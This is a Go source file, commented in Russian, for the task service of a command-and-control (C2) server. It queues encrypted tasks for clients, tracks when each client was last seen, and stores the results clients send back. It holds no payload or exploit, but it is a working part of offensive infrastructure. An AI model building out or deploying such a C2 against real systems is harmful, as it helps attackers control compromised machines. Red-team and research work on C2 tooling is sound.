// Package service содержит бизнес-логику C2-сервера.
// Отделяет HTTP-хендлеры от работы с данными.
package service

import (
	"c2-project/internal/models"
	"c2-project/internal/protocol"
	"c2-project/internal/storage"
	"encoding/json"
	"errors"
)

// TaskService - сервис для работы с задачами.
type TaskService struct {
	store *storage.Storage
}

// NewTaskService - создаёт новый TaskService.
func NewTaskService(store *storage.Storage) *TaskService {
	return &TaskService{store: store}
}

// CreateTaskFromToken - принимает зашифрованный токен, декодирует его
// и создаёт задачу в хранилище. Возвращает ID созданной задачи.
func (s *TaskService) CreateTaskFromToken(token string) (string, error) {
	// Декодируем задачу из токена
	data, err := protocol.DecodeRequest(token)
	if err != nil {
		return "", err
	}

	// Преобразуем данные в структуру Task
	jsonData, err := json.Marshal(data)
	if err != nil {
		return "", err
	}

	var task models.Task
	if err := json.Unmarshal(jsonData, &task); err != nil {
		return "", err
	}

	// Сохраняем задачу через storage
	taskID := s.store.CreateTask(task)
	return taskID, nil
}

// GetPendingTaskForClient - возвращает задачу для клиента
// и дополнительно шифрует её для отправки.
func (s *TaskService) GetPendingTaskForClient(clientID string) (models.Task, string, error) {
	// Обновляем время последнего визита
	s.store.UpdateClientLastSeen(clientID)

	// Ищем задачу
	task, found := s.store.GetPendingTask(clientID)
	if !found {
		return models.Task{}, "", nil
	}

	// Дополнительно шифруем задачу
	token, err := protocol.EncodeRequest(task)
	if err != nil {
		return models.Task{}, "", err
	}

	return task, token, nil
}

// SaveTaskResult - сохраняет результат выполнения задачи.
// Принимает зашифрованный токен с результатом.
func (s *TaskService) SaveTaskResult(token string) error {
	// Декодируем результат
	data, err := protocol.DecodeRequest(token)
	if err != nil {
		return err
	}

	// Преобразуем в map
	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	var result map[string]interface{}
	if err := json.Unmarshal(jsonData, &result); err != nil {
		return err
	}

	taskID, _ := result["task_id"].(string)
	output, _ := result["output"].(string)
	status, _ := result["status"].(string)

	if taskID == "" {
		return errors.New("missing task_id")
	}

	// Сохраняем результат
	s.store.UpdateTaskResult(taskID, output, status)
	return nil
}

// GetTaskResult - возвращает результат задачи по её ID.
func (s *TaskService) GetTaskResult(taskID string) (models.Task, error) {
	task, exists := s.store.GetTask(taskID)
	if !exists {
		return models.Task{}, errors.New("task not found")
	}
	return task, nil
}
